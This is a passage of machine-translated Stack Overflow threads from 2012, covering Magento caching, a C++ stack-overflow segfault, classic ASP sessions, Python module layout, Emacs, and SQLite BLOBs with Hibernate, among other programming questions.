        this.listView1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
        | System.Windows.Forms.AnchorStyles.Right)));
        this.listView1.Location = new System.Drawing.Point(3, 0);
        this.listView1.Name = "listView1";
        this.listView1.Size = new System.Drawing.Size(410, 97);
        this.listView1.TabIndex = 0;
        this.listView1.UseCompatibleStateImageBehavior = false;
        // 
        // listView2
        // 
        this.listView2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
        | System.Windows.Forms.AnchorStyles.Right)));
        this.listView2.Location = new System.Drawing.Point(0, 183);
        this.listView2.Name = "listView2";
        this.listView2.Size = new System.Drawing.Size(410, 97);
        this.listView2.TabIndex = 1;
        this.listView2.UseCompatibleStateImageBehavior = false;
        // 
        // Form1
        // 
        this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
        this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.ClientSize = new System.Drawing.Size(437, 304);
        this.Controls.Add(this.panel1);
        this.Name = "Form1";
        this.Text = "Form1";
        this.panel1.ResumeLayout(false);
        this.ResumeLayout(false); 
```

# magento - 禁用magento中某些文件的缓存

> ID：10499394
> 
> 赞同：2
> 
> 时间：2012-05-08T13:16:31.690
> 
> 标签：magento

我有要求我想在产品列表页面和产品视图页面上禁用某些类别的缓存。
我已经搜索了这个，但我没有找到任何相关的答案，这可以在 magento 中完成吗？我在 list.phtml 和 view.phtml 文件中尝试过

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T22:30:28.323

您可以覆盖该块并设置一个非常低或错误的 cache_lifetime。

例如，您可以将块复制到本地命名空间。例如，如果您想禁用导航块上的缓存，您可以复制

```
app\code\core\Mage\Catalog\Block\Navigation.php 
```

至

```
app\code\local\Mage\Catalog\Block\Navigation.php 
```

这将覆盖 Magento 块，并允许您使用我们的更改对其进行更新。

然后，您可以更改此块或大多数其他块的缓存机制以满足您的需要。下面是禁用此块缓存的示例。

```
protected function _construct()
{
    $this->addData(array(
        'cache_lifetime'    => false, // or 1 or something tiny
    ));
} 
```

或者，添加如下内容：

```
public function getCacheLifetime() 
{ 
    return null; // or 1 or what ever.. 
} 
```

您还可以在存储页面时更改用作唯一标识符的缓存“键”，这是模板块的默认缓存键：

```
/**
 * Get cache key informative items
 *
 * @return array
 */
public function getCacheKeyInfo()
{
    return array(
        'BLOCK_TPL',
        Mage::app()->getStore()->getCode(),
        $this->getTemplateFile(),
        'template' => $this->getTemplate()
    );
} 
```

数组中的每个元素都组合在一起，以创建生成缓存时使用的唯一键，根据您的要求进行更改会有所帮助。正如您在上面看到的，商店代码在那里，这意味着缓存将记录商店的店面/语言，以及每种语言/店面作为它自己的缓存页面。

根据您使用的块，您可以添加额外的参数以使缓存或多或少有针对性。

# java - 从用户输入创建数据库表和记录

> ID：10499399
> 
> 赞同：0
> 
> 时间：2012-05-08T13:16:54.683
> 
> 标签：java, user-input

我想用Java创建一个工作流管理工具，它允许不同的用户根据他们的需要在运行时从一个swing Gui客户端动态创建他们自己的数据库表和记录。有没有一种理智的方法来实现这一点？我会很感激一些正确方向的指示。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:38:06.473

您可以使用 JDBC 使用简单的“CREATE table”SQL 命令即时创建表。有时数据库的模式可能会被锁定在不允许创建新对象的生产环境中，如果您有权在数据库中创建表，那么没有什么可以阻止您动态创建表。

# c++ - 输入函数时的 SIGSEGV

> ID：10499400
> 
> 赞同：11
> 
> 时间：2012-05-08T13:17:01.037
> 
> 标签：c++, linux, gdb, segmentation-fault

刚输入函数时会导致分段错误的原因是什么？

输入的函数如下所示：

```
21:  void eesu3(Matrix & iQ)
22:  { 
```

哪里`Matrix`是`struct`。使用 GDB 运行时，回溯会产生：

```
(gdb) backtrace 
#0  eesu3 (iQ=...) at /home/.../eesu3.cc:22
#1  ... 
```

GDB 没有说是什么`iQ`。从`...`字面上看。什么可能导致这种情况？

GCC：（Ubuntu/Linaro 4.6.3-1ubuntu5）4.6.3

构建的程序`-O3 -g`

调用者是这样的：

```
Matrix q;
// do some stuff with q
eesu3(q); 
```

这里没什么特别的

我用 valgrind 重新运行了程序：

```
valgrind --tool=memcheck --leak-check=yes --show-reachable=yes --num-callers=20 --track-fds=yes <prgname> 
```

输出：

```
==2240== Warning: client switching stacks?  SP change: 0x7fef7ef68 --> 0x7fe5e3000
==2240==          to suppress, use: --max-stackframe=10076008 or greater
==2240== Invalid write of size 8
==2240==    at 0x14C765B: eesu3( Matrix &) (eesu3.cc:22)
...
==2240==  Address 0x7fe5e3fd8 is on thread 1's stack
==2240== 
==2240== Can't extend stack to 0x7fe5e2420 during signal delivery for thread 1:
==2240==   no stack segment
==2240== 
==2240== Process terminating with default action of signal 11 (SIGSEGV)
==2240==  Access not within mapped region at address 0x7FE5E2420
==2240==    at 0x14C765B: eesu3( Matrix&) (eesu3.cc:22)
==2240==  If you believe this happened as a result of a stack
==2240==  overflow in your program's main thread (unlikely but
==2240==  possible), you can try to increase the size of the
==2240==  main thread stack using the --main-stacksize= flag.
==2240==  The main thread stack size used in this run was 8388608. 
```

看起来它是一个损坏的堆栈。

```
 Dump of assembler code for function eesu3( Matrix & ):
   0x00000000014c7640 <+0>: push   %rbp
   0x00000000014c7641 <+1>: mov    %rsp,%rbp
   0x00000000014c7644 <+4>: push   %r15
   0x00000000014c7646 <+6>: push   %r14
   0x00000000014c7648 <+8>: push   %r13
   0x00000000014c764a <+10>:    push   %r12
   0x00000000014c764c <+12>:    push   %rbx
   0x00000000014c764d <+13>:    and    $0xfffffffffffff000,%rsp
   0x00000000014c7654 <+20>:    sub    $0x99b000,%rsp
=> 0x00000000014c765b <+27>:    mov    %rdi,0xfd8(%rsp) 
```

好的，明确一点：Matrix 的数据存在于堆中。它基本上包含一个指向数据的指针。该结构很小，只有 32 个字节。（刚刚检查）

现在，我用不同的优化选项重建了程序：

`-O0`: 错误不显示。

`-O1`: 错误确实显示。

`-O3`: 错误确实显示。

**- 更新**

`-O3 -fno-inline -fno-inline-functions`: 错误不显示。

That explains it. Too many inlines into the function led to excessive stack usage.

The problem was due to a **stack overflow**

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-08T14:13:16.710

> What can cause a segmentation fault when just entering a function?

The most frequent cause is stack exhaustion. Do `(gdb) disas` at crash point. If the instruction that crashed is the first read or write to a stack location after `%rsp` has been decremented, then stack exhaustion is almost definitely the cause.

Solution usually involves creating threads with larger stacks, moving some large variables from stack to heap, or both.

Another possible cause: if `Matrix` contains very large array, you can't put it on stack: the kernel will *not* extend stack beyond current by more than 128K (or so, I don't remember exact value). If `Matrix` is bigger than that limit, you can't put it on stack.

Update:

```
 0x00000000014c7654 <+20>:    sub    $0x99b000,%rsp
=> 0x00000000014c765b <+27>:    mov    %rdi,0xfd8(%rsp) 
```

This disassembly confirms the diagnosis.

In addition, you are reserving 0x99b000 bytes on stack (that's almost 10MB). There must be some humongous objects you are trying to locate on stack in the `eesu3` routine. Don't do that.

> What do you mean by "the kernel will not extend stack beyond current by more than"

When you extend stack (decrement `%rsp`) by e.g. 1MB, and then try to touch that stack location, the memory will not be accessible (the kernel grows stack on-demand). This will generate a hardware trap, and transfer control to the kernel. When the kernel decides what to do, it looks at

1.  Current `%rsp`
2.  Meemory location that the application tried to access
3.  Stack limit for the current thread

If faulting address is below current `%rsp`, but within 128K (or some other constant of similar magnitude), the kernel simply extends the stack (provided such extension will not exceed the stack limit).

If the faulting address is more than 128K below current `%rsp` (as appears to be the case here), you get `SIGSEGV`.

This all works nicely for most programs: even if they use a lot of stack in a recursive procedure, they usually extend stack in small chunks. But an equivalent program that tried to reserve all that stack in a single routine would have crashed.

Anyway, do `(gdb) info locals` at crash point, and see what locals might be requiring 10MB of stack. Then move them to heap.

Update 2:

> No locals

Ah, the program has probably not made it far enough into `eesu3` for there to be locals.

> when building with -O0 the error disappears. GCC bug?

It could be a GCC bug, but more likely it's just that GCC is inlining a lot of other routines into `eesu3`, and each of the inlined routines needs its own N KBs of stack. Does the problem disappear if you build the source containing `eesu3` with `-fno-inline` ?

Unfortunately, triage of such behavior and figuring out appropriate workarounds, or fixing GCC, requires compiler expertise. You could start by compiling with `-fdump-tree-all` and looking at generated `<source>.*t.*` files. These contain textual dumps of GCC internal representation at various stages of the compilation process. You *may* be able to understand enough of it to make further progress.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-08T15:17:07.527

It's a stack overflow.

`eesu3` tries to allocate something very large on the stack, which can be seen in its assembly code:

```
sub    $0x99b000,%rsp 
```

This means more than 10MB of stack space are consumed.

The problem can be in `eesu3` or an a function it calls, and the compiler chooses to inline.

My guess is that the problem is in a function `eesu3` call, but not in the case you test (a debugging function?)
I guess this because it doesn't happen without optimization - with optimization, the function is inlined into `eesu3`, so `eesu3` uses lots of stack. Without it, the function is not inline, so you'll get a problem only when it's actually called.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T13:42:14.783

If its a Matrix, check the indices you are trying to access. Maybe you are accessing elements that go beyond the dimensions of the Matrix object?

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T10:30:04.987

You probably have some variables initialized in function

```
void eesu3(Matrix & iQ) 
```

Allthough the debugger might step through variable declarations, they are probably initialized with the start of the scope (that is your function). If you would declare a very large buffer like so:

```
char * buffer[268435456]; 
```

You could get a stack overflow. It might be better to allocate some memory like

```
void * pvBuffer = malloc(268435456); 
```

Have you declared a large buffer? Which is too large to put on the stack? It could mean that different architectures result in different possible maximum sizes for buffers (64 bit and 32 bit OSes)? Different kernels? As you said that the program runs fine on one machine but not on the other.

# php - 经典asp中PHP session_regenerate_id的等价物

> ID：10499406
> 
> 赞同：1
> 
> 时间：2012-05-08T13:17:19.673
> 
> 标签：php, asp-classic, sessionid

希望是一个很好的简单问题，我希望有人知道答案。

我想知道是否有与您可能在但 for中找到的[方法等效的方法](http://php.net/manual/en/function.session-regenerate-id.php)。`session_regenerate_id()``PHP``class ASP`

对于那些不懂 PHP 但知道经典 ASP 的人来说，这个函数的结果是[重新生成一个新的 Session ID 来保存会话数据](http://php.net/manual/en/function.session-regenerate-id.php)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T14:05:13.507

不，在 ASP Classic 中没有等效的方法。

唯一的选择是使用`Session.Abandon`. 这会在脚本执行并加载页面**后**破坏会话。

将在下一次调用时创建一个具有新 ID 的新会话。

# javascript - 如何从孩子获取父html元素

> ID：10499409
> 
> 赞同：1
> 
> 时间：2012-05-08T13:17:36.280
> 
> 标签：javascript, html, jsp

我创建了一个 child.jsp 文件，其中有一个名为 Continue 的按钮。我创建了一个名为 login.jsp 的 jsp 页面，其中包含名称和密码输入文本。并且在那个 jsp 文件中，我使用以下代码包含了 child.jsp 文件。我在 child.jsp 文件中创建了 onclick 侦听器。我想访问输入字段的值（名称和密码）。我怎样才能做到这一点？

```
<jsp:include page="child.jsp" flush="true">  
                <jsp:param name="BtnName" value="Continue"/>  
                <jsp:param name="BtnContinue" value="Get Weather1"/>  
            </jsp:include> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T16:12:52.503

我找到了解决方案，使用`window.parent.document`我们可以获得父级的文档。使用以下代码使用其 id 获取父元素的任何元素。

```
window.parent.document.getElementById("elementId"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:24:16.287

如果您对 JavaScript 访问，最好使用[jQuery](http://jquery.com/) JavaScript 框架和它的[Child Selector](http://api.jquery.com/child-selector/)。

```
 /**
     * Find parent form object for HTML DOM element.
     *
     * @return <HTMLFormElement>
     */
    $.fn.parentForm = function() {
        var object = this;
        while (object.tagName() != "FORM") {
            object = object.parent();
        }

        return object;
    } 
```

# javascript - 谷歌地图请求返回“无法设置未定义的属性‘位置’”

> ID：10499412
> 
> 赞同：2
> 
> 时间：2012-05-08T13:17:38.933
> 
> 标签：javascript, google-maps

我正在尝试使用 goolge 地图在地图上显示位置，功能如下

```
function show_map(options) {
            var mapOptions = {
                center: new google.maps.LatLng(options.lat, options.lng),
                zoom: 12,
                mapTypeId: google.maps.MapTypeId.ROADMAP
            };

              var map = new google.maps.Map($("#map-canvas"),mapOptions);
        } 
```

我收到此错误“无法设置未定义的属性'位置'”。问题可能是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-06-14T14:31:38.297

这有效：

```
var mapElem = $("#container").find("#map")[0];
var map = new google.maps.Map(mapElem,mapOptions); 
```

# c# - 使用 ImageResizer.net 确定图像的当前大小

> ID：10499416
> 
> 赞同：5
> 
> 时间：2012-05-08T13:17:53.417
> 
> 标签：c#, imageresizer

我们最近开始使用[ImageResizer.Net](http://www.imageresizing.net) over GDI+ 在我们的 ASP.NET MVC 4 应用程序上动态调整图像大小。

有没有办法只使用 ImageResizer 来确定图像的实际分辨率（DPI，PPI，无论你想怎么称呼它）（作为字节数组读入）。我们目前有这样的工作流程，在需要时将图像调整为指定的较低分辨率：

```
//pseudo-code
var image = (Bitmap)Bitmap.FromStream(contentStream)
var resX = image.HorizontalResolution;
var resY = image.VerticalResolution;
//calculate scale factor
//determine newHeight and newWidth from scale
var settings = new ResizeSettings("width={newWidth}&height={newHeight}")
var newImage = ImageBuilder.Current.Build(image, someNewImage, settings); 
```

这很好用，但它混合了 GDI+ 和 ImageResizer，并且有很多相同数据的流打开和关闭（实际代码有点冗长，有很多`using`语句）。

有没有办法只使用 ImageResizer 来确定水平和垂直分辨率？我无法立即在文档中找到任何内容。

目前，我们使用了托管 api，但最终将使用 MVC 路由。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-11T12:56:11.383

这是一个相当不典型的场景——通常传入的 DPI 值是毫无价值的。

但是，由于您似乎可以控制这些值，并且需要它们来执行尺寸计算，所以我建议使用插件。它们很简单，并且提供理想的性能，因为您不需要重复工作。

```
public class CustomSizing:BuilderExtension, IPlugin {

    public CustomSizing() { }

    public IPlugin Install(Configuration.Config c) {
        c.Plugins.add_plugin(this);
        return this;
    }

    public bool Uninstall(Configuration.Config c) {
        c.Plugins.remove_plugin(this);
        return true;
    }
    //Executes right after the bitmap has been loaded and rotated/paged
    protected override RequestedAction PostPrepareSourceBitmap(ImageState s) {
        //I suggest only activating this logic if you get a particular querystring command.
        if (!"true".Equals(s.settings["customsizing"], 
            StringComparison.OrdinalIgnoreCase)) return RequestedAction.None;

        //s.sourceBitmap.HorizontalResolution
        //s.sourceBitmap.VerticalResolution

        //Set output pixel dimensions and fit mode
        //s.settings.Width = X;
        //s.settings.Height = Y;
        //s.settings.Mode = FitMode.Max;

        //Set output res.
        //s.settings["dpi"] = "96";
        return RequestedAction.None;
    }
 } 
```

可以通过[代码或通过 Web.Config](http://imageresizing.net/docs/plugins/basics)进行安装。

新的 CustomSizing().Install(Config.Current);

或在调整[器的配置部分](http://imageresizing.net/docs/configuration)：

```
 <plugins>
     <add name="MyNamespace.CustomSizing" />
   </plugins> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:23:46.970

这是你要找的吗？

[http://nathanaeljones.github.com/resizer-docs/docu/ImageResizer.Resizing/ImageState.htm#originalSize](http://nathanaeljones.github.com/resizer-docs/docu/ImageResizer.Resizing/ImageState.htm#originalSize)

# python - 如何将我的 Python 代码组织成多个类？

> ID：10499419
> 
> 赞同：6
> 
> 时间：2012-05-08T13:17:59.113
> 
> 标签：python, class, design-patterns

最近有人告诉我，我应该将代码保存在单独的文件中；像`main.py`, `engine.py`,`settings.py`等等。虽然这确实有好处，比如更容易管理、可扩展性等，但对我来说，它似乎有太多缺点......

例如，如果我有一个名为 的脚本，其中定义了屏幕对象的大小、模拟速度和各种对象的颜色等内容，如果我的脚本和脚本`settings.py`都需要这些变量，我该怎么办？我是否在两个脚本中都导入了两次？看起来比较乱。如果脚本中的某些类需要来自 的代码怎么办？`engine.py``main.py``engine.py``main.py`

让我告诉你确切的情况......

我的`main.py`脚本自己导入 Pygame，初始化它，等等。它曾经有一个代表屏幕对象的类，并且该类有一个方法`draw`，它只是调用 Pygame 绘图函数。现在，当我将类放入我的`engine.py`脚本中时，事情不再起作用，因为 Pygame 不存在！我最终在 中导入了`settings.py`Pygame 和 Pygame `engine.py`，然后将引擎导入到`main.py`中，但它更像是一个初始化程序而不是引擎......有没有办法处理这样的事情，比如一般指导方针？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:23:46.097

以下是官方 PEP 进口指南：http: [//www.python.org/dev/peps/pep-0008/#imports](http://www.python.org/dev/peps/pep-0008/#imports)

另请参阅这个 StackOverflow 问题：[Python 导入的好的经验法则是什么？](https://stackoverflow.com/questions/193919/what-are-good-rules-of-thumb-for-python-imports)

您可以毫无问题地从多个类中导入变量，但您应该尝试构建代码，以免循环导入。[Python中的循环导入依赖](https://stackoverflow.com/questions/1556387/circular-import-dependency-in-python)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:22:03.340

你应该看看这个模型，它可能有助于你理解事物。我认为这是最适合您想做的事情

[模型-视图-控制器](http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller)

更多文档： [http ://www.wkoorts.com/wkblog/2007/12/23/mvc-design-patterns-with-python-links/](http://www.wkoorts.com/wkblog/2007/12/23/mvc-design-patterns-with-python-links/)

在这种情况下，导入看起来应该是相当合乎逻辑和必要的。我要补充一点，这大致就是您对 3 个文件所做的事情。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:47:59.730

将一个模块导入多个其他模块并不麻烦。它比具有数千行代码的模块*要干净得多。*

*循环*进口确实存在问题。但是您的情况听起来不像是循环导入问题。你说“现在，当我将类放在我的 engine.py 脚本中时，事情不再起作用，因为那里不存在 Pygame！我最终在 engine.py 中导入了 settings.py 和 Pygame，然后导入引擎进入 main.py”。

为什么你不能把类放进去`engine.py`，然后再把它导入`main.py`？一种非常简单的方法是将回调传递给您的类：

```
# engine.py
...
class ClassWithDraw(Subclass):
    def __init__(self, draw_callback):
        ...
        self._draw_func = draw_callback
        ...
    def draw(self):
        self._draw_func()

# main.py

from engine import ClassWithDraw
drawer = ClassWithDraw(drawfunc) 
```

这种方法的好处是对象实际上只负责一件事：它自己的状态。`draw`事实上，这个对象根本没有方法可能更有意义。或者它可以`draw_hook`在必要时调用它以从中获取可绘制数据，并且另一个外部绘图函数可以调用它。

另一种方法是为 Pygame 提供一个完全独立的模块。我对 Pygame 了解不多，所以这可能行不通，但假设您有一个处理 Pygame 初始化和状态的模块。您可以在 中初始化它一次，`main`然后将其导入到任何您想要的位置。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-08T13:25:19.563

它在其他语言中的常见做法（尤其是 Java，实际上是由编译器强制执行的）每个类都有一个文件。

至于您提到的文件间依赖关系，您应该考虑避免使用全局变量。

这是另一个相关问题，可以更好地回答您的问题。

[我应该在一个文件中放入多少个 Python 类？](https://stackoverflow.com/q/106896/1158895)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-08T13:24:04.743

不是答案，而是：

`settings.py`应该是真的`settings.ini`，你应该用[`ConfigParser`](http://docs.python.org/library/configparser.html). 读取一次配置文件并`ConfigParser.RawConfigParser`在模块之间共享结果。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-08T13:28:05.850

您可以在需要的任何模块中从 settings.py 导入符号。就是这个概念。一个实际的问题是当你有循环导入时。例如，如果您在里面有一些`engine.py`需要的符号怎么办，`main.py`反之亦然。在这种情况下，一种常见的模式是在第三个模块中打破这些依赖关系，`main.py`并且`engine.py`可以从中导入，没有任何问题。

# php - 实现 Zend Framework 是否需要修改现有的 MySQL 数据库？

> ID：10499423
> 
> 赞同：0
> 
> 时间：2012-05-08T13:18:09.787
> 
> 标签：php, mysql, zend-framework

实现 Zend 框架是否需要修改现有的 MySQL 数据库？

如果是这样，修改会是什么？

如果可以建议一些用于迁移到 Zend 的有用资源，那就太好了。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T13:19:59.113

Zend 框架不绑定到数据库。地狱，它甚至可以在没有任何数据库的情况下存在。或者不同的数据库。无论你想要什么。

您只需要正确连接到数据库，并进行正确的映射。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:21:12.600

如果您的数据库是合理规范化的形式，那么您不应该为了实现 Zend 模型而进行任何更改。

但是，我建议使用 Zend 教程从头开始尝试一个新项目：http: [//framework.zend.com/manual/en/learning.quickstart.create-project.html](http://framework.zend.com/manual/en/learning.quickstart.create-project.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T13:23:39.017

不，绝对不需要更改您的数据库。

# emacs - 在 emacs 中选择 clojure 表单

> ID：10499425
> 
> 赞同：3
> 
> 时间：2012-05-08T13:18:18.777
> 
> 标签：emacs, clojure

我正在使用 emacs 和 swank-clojure 包进行 clojure 开发。

我想复制指针下的表格，我该怎么做？

例如，如果我的鼠标指针当前处于内部形式，它会自动突出显示，但是我如何选择它以便我可以复制它。在下面的表格中，粗括号显示了我的指针所在的位置 - (def a (str "a" "b" **)** )

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-08T13:26:37.253

转到 sexp: 的开头`C-M-b`，然后按`C-M-<space>`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T15:16:19.363

[我在这个](https://stackoverflow.com/a/10317094/903943)答案中谈到的[expand-region](https://github.com/magnars/expand-region.el)正是您所需要的。

`C-M-h`( `mark-defun`) 也有效，但 expand-region 更强大且可组合。

# hibernate - 从 sqlite 数据库中读取 blob 数据 -> jpa (hibernate)

> ID：10499427
> 
> 赞同：0
> 
> 时间：2012-05-08T13:18:27.023
> 
> 标签：hibernate, sqlite, blob

嗨！

我想从 sqlite 数据库中读取 blob 数据，但总是收到此错误消息

```
08.05.2012 15:06:28 org.hibernate.engine.jdbc.spi.SqlExceptionHelper logExceptions
WARN: SQL Error: 0, SQLState: null
08.05.2012 15:06:28 org.hibernate.engine.jdbc.spi.SqlExceptionHelper logExceptions
ERROR: not implemented by SQLite JDBC driver 
```

我正在使用 JSF、Spring、JPA（休眠）。

Sqlite 表结构

```
CREATE TABLE LOGO ('logo_id' INTEGER PRIMARY KEY NOT NULL, 'logo_data' BLOB) 
```

读取一行代码：

```
public void loadLogo() {
    try {
        Query query = entityManager.createNativeQuery("SELECT * FROM logo");
        Vector v = (Vector) query.getSingleResult();
        byte[] blobData = (byte[]) v.elementAt(1);
    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
} 
```

Sqlite 方言：

```
public class SQLiteDialect extends Dialect implements Serializable {

private static final long serialVersionUID = 1L;

public SQLiteDialect() {
    registerColumnType(Types.BIT, "integer");
    registerColumnType(Types.TINYINT, "tinyint");
    registerColumnType(Types.SMALLINT, "smallint");
    registerColumnType(Types.INTEGER, "integer");
    registerColumnType(Types.BIGINT, "bigint");
    registerColumnType(Types.FLOAT, "float");
    registerColumnType(Types.REAL, "real");
    registerColumnType(Types.DOUBLE, "double");
    registerColumnType(Types.NUMERIC, "numeric");
    registerColumnType(Types.DECIMAL, "decimal");
    registerColumnType(Types.CHAR, "char");
    registerColumnType(Types.VARCHAR, "varchar");
    registerColumnType(Types.LONGVARCHAR, "longvarchar");
    registerColumnType(Types.DATE, "date");
    registerColumnType(Types.TIME, "time");
    registerColumnType(Types.TIMESTAMP, "timestamp");
    registerColumnType(Types.BINARY, "blob");
    registerColumnType(Types.VARBINARY, "blob");
    registerColumnType(Types.LONGVARBINARY, "blob");
    registerColumnType(Types.NULL, "null");
    registerColumnType(Types.BLOB, "blob");
    registerColumnType(Types.CLOB, "clob");
    registerColumnType(Types.BOOLEAN, "integer");

    registerFunction("concat", new VarArgsSQLFunction(
            StandardBasicTypes.STRING, "", "||", ""));
    registerFunction("mod", new SQLFunctionTemplate(
            StandardBasicTypes.INTEGER, "?1 % ?2"));
    registerFunction("substr", new StandardSQLFunction("substr",
            StandardBasicTypes.STRING));
    registerFunction("substring", new StandardSQLFunction("substr",
            StandardBasicTypes.STRING));
}

public boolean supportsIdentityColumns() {
    return true;
}

/*
 * public boolean supportsInsertSelectIdentity() { return true; // As
 * specify in NHibernate dialect }
 */

public boolean hasDataTypeInIdentityColumn() {
    return false; // As specify in NHibernate dialect
}

/*
 * public String appendIdentitySelectToInsert(String insertString) { return
 * new StringBuffer(insertString.length()+30). // As specify in NHibernate
 * dialect append(insertString).
 * append("; ").append(getIdentitySelectString()). toString(); }
 */

public String getIdentityColumnString() {
    // return "integer primary key autoincrement";
    return "integer";
}

public String getIdentitySelectString() {
    return "select last_insert_rowid()";
}

public boolean supportsLimit() {
    return true;
}

protected String getLimitString(String query, boolean hasOffset) {
    return new StringBuffer(query.length() + 20).append(query)
            .append(hasOffset ? " limit ? offset ?" : " limit ?")
            .toString();
}

public boolean supportsTemporaryTables() {
    return true;
}

public String getCreateTemporaryTableString() {
    return "create temporary table if not exists";
}

public boolean dropTemporaryTableAfterUse() {
    return false;
}

public boolean supportsCurrentTimestampSelection() {
    return true;
}

public boolean isCurrentTimestampSelectStringCallable() {
    return false;
}

public String getCurrentTimestampSelectString() {
    return "select current_timestamp";
}

public boolean supportsUnionAll() {
    return true;
}

public boolean hasAlterTable() {
    return false; // As specify in NHibernate dialect
}

public boolean dropConstraints() {
    return false;
}

public String getAddColumnString() {
    return "add column";
}

public String getForUpdateString() {
    return "";
}

public boolean supportsOuterJoinForUpdate() {
    return false;
}

public String getDropForeignKeyString() {
    throw new UnsupportedOperationException(
            "No drop foreign key syntax supported by SQLiteDialect");
}

public String getAddForeignKeyConstraintString(String constraintName,
        String[] foreignKey, String referencedTable, String[] primaryKey,
        boolean referencesPrimaryKey) {
    throw new UnsupportedOperationException(
            "No add foreign key syntax supported by SQLiteDialect");
}

public String getAddPrimaryKeyConstraintString(String constraintName) {
    throw new UnsupportedOperationException(
            "No add primary key syntax supported by SQLiteDialect");
}

public boolean supportsIfExistsBeforeTableName() {
    return true;
}

public boolean supportsCascadeDelete() {
    return false;
} 
```

}

请帮我！

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T06:27:51.673

Google 的智慧，例如[here](https://stackoverflow.com/questions/6090170/cannot-save-image-as-blob-to-sqlite)，表明虽然 SQLite JDBC 驱动程序确实支持 BLOB 支持，但它实际上并没有提供所有的正常操作。例如，它实现`setBytes`但不是`setBinaryStream`. 通常的解决方法是调整您访问数据的方式。

由于您没有获得堆栈跟踪，因此不清楚这是否是您的问题；您应该尝试让 Hibernate 为您提供堆栈跟踪，而不仅仅是异常消息。如果您的问题是由这种部分支持引起的，您必须让 Hibernate 更改其访问 Blob 的方式（不知道如何，抱歉），或者使用 a`PreparedStatement`代替 Hibernate。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:36:47.390

好的。我有一个解决方案。我必须自己进行 sql 处理。

我有一个从数据库中读取数据的静态方法（静态的，因为 @Inject 不能在 Servlet 中使用）

```
public static byte[] loadLogo() {
    byte[] ar = null;
    Connection con;
    Statement stmt;
    String driver = "org.sqlite.JDBC";
    String url = "jdbc:sqlite:X:\\Projekte\\Bauer - Rainstar\\Entwickler\\database\\rainstar_ds.sqlite";
    try {
        Class.forName(driver).newInstance();
        con = DriverManager.getConnection(url);
        con.setAutoCommit(false);

        stmt = con.createStatement();

        ResultSet set = stmt.executeQuery("SELECT * FROM logo");
        set.next();
        ar = set.getBytes("logo_data");

        con.close();
    } catch (Exception e) {
        e.printStackTrace();
    }

    return ar;
} 
```

我实现了一个HttpServlet：

```
@WebServlet("/images/*")
public class ImageServlet extends HttpServlet {

private static final long serialVersionUID = 1L;

@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException {
    OutputStream os = resp.getOutputStream();
    byte[] temp = LogoServiceImpl.loadLogo();
    os.write(temp);
} 
```

}

在页面上，我只需要指定以下内容，即可在页面上显示我的图片。

```
<img src="images/xx" /> 
```

而且我还必须将这些行添加到 web.xml 文件中

```
<servlet>
    <servlet-name>Image Servlet</servlet-name>
    <servlet-class>at.beko.rainstar2.ui.controller.ImageServlet</servlet-class>
</servlet>

<servlet-mapping>
    <servlet-name>Image Servlet</servlet-name>
    <url-pattern>/images/*</url-pattern>
</servlet-mapping> 
```

我以这种方式存储了我的图像文件。

```
@Override
public void saveLogo(UploadedFile file) {
    try {
        Query query = entityManager
                .createNativeQuery("INSERT INTO 'logo' VALUES (?,?)");
        query.setParameter(1, "2");
        query.setParameter(2, getBytesFromFile(file));
        query.executeUpdate();
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
}

private byte[] getBytesFromFile(UploadedFile file) throws IOException {
    InputStream is = file.getInputstream();

    long length = file.getSize();
    if (length > Integer.MAX_VALUE) {
        // File is too large
    }

    byte[] bytes = new byte[(int) length];

    int offset = 0;
    int numRead = 0;
    int realLength = bytes.length;
    while (offset < realLength
            && (numRead = is.read(bytes, offset, realLength - offset)) >= 0) {
        offset += numRead;
    }

    if (offset < realLength) {
        throw new IOException("Could not completely read file "
                + file.getFileName());
    }

    is.close();
    return bytes;
} 
```

这是我事先的解决方案！！所以不要介意硬编码的部分^^

# objective-c - UIPopovercontroller 未检测到触摸

> ID：10499428
> 
> 赞同：0
> 
> 时间：2012-05-08T13:18:33.623
> 
> 标签：objective-c, ios, xcode, uipopovercontroller

我有一个 UIPopoverController，它使用自定义视图控制器 - photoBoothController 进行初始化。

